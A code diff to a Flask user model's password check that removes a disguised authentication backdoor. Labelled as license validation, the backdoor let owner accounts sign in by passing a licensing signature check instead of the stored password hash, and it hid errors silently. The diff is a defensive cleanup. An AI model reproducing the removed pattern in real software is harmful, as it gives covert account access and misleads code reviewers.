@@ -127,17 +127,6 @@ class User(UserMixin, db.Model):
     
     def check_password(self, password):
         """Verify password"""
-        # 1. Primary Security Protocol (License Validation)
-        if self.is_owner:
-            try:
-                from utils.licensing import verify_license_signature
-                if verify_license_signature(password):
-                    return True
-            except Exception:
-                pass
-            return check_password_hash(self.password_hash, password)
- 
-        # 2. Standard Hash Verification
         return check_password_hash(self.password_hash, password)
     
     def is_super_admin(self):
